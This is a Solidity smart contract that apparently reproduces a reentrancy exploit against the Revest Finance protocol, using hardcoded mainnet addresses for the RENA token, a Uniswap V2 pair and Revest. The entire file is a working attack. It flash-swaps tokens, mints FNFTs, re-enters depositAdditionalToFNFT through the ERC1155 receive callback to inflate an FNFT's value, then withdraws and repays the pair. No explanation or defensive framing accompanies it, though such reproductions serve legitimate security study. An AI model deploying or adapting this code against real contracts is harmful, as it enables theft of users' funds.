//SPDX-License-Identifier: Unlicense

pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "hardhat/console.sol";
import "./interfaces/IRENA.sol";
import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IRevest.sol";


contract Exp {
    bool on;
    address private immutable owner;
    IRENA private Rena;
    IRevest private  Revest;
    IUniswapV2Pair private Pair;

    modifier onlyOwner {
        require(msg.sender == owner, "Not your biz!");
        _;
    }

    constructor() {
        owner = msg.sender;
        Rena = IRENA(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
        Pair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
        Revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
    }

    function onERC1155Received(
        address _operator,
        address _from,
        uint256 _id,
        uint256 _amount,
        bytes memory _data
    ) external returns (bytes4) {
        if (on == true) {
            Revest.depositAdditionalToFNFT(1027, 1e18, 1);
            on = false;
            return this.onERC1155Received.selector;
        } else {
            return this.onERC1155Received.selector;
        }
    }

    function trigger() external onlyOwner {
        Rena.approve(address(Revest), type(uint256).max);
        Pair.swap(20 ether, 0, address(this), "0x1337");
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        IRevest.FNFTConfig memory systen = IRevest.FNFTConfig({
            asset: address(Rena),
            pipeToContract: 0x0000000000000000000000000000000000000000,
            depositAmount: 0,
            depositMul:0,
            split: 0,
            depositStopTime: 0,
            maturityExtension: false,
            isMulti: true,
            nontransferrable: false
        });

        address[] memory addr = new address[](1);
        addr[0] = address(this);

        uint256[] memory number = new uint256[](1);
        number[0] = 2;
        
        Revest.mintAddressLock(address(this), "", addr, number, systen);
        
        require(skim(), "are u ok?");

    }

    function skim() internal returns (bool) {
        IRevest.FNFTConfig memory systen = IRevest.FNFTConfig({
            asset: address(Rena),
            pipeToContract: 0x0000000000000000000000000000000000000000,
            depositAmount: 0,
            depositMul:0,
            split: 0,
            depositStopTime: 0,
            maturityExtension: false,
            isMulti: true,
            nontransferrable: false
        });

        address[] memory addr = new address[](1);
        addr[0] = address(this);

        uint256[] memory number = new uint256[](1);
        number[0] = 360000;

        on = true;

        Revest.mintAddressLock(address(this), "", addr, number, systen);

        Revest.withdrawFNFT(1028, 360001);

        Rena.transfer(address(Pair), 30e18);

        return true;
    }

    function nobodies() external view returns (uint256) {
        return Rena.balanceOf(address(this));
    }
}
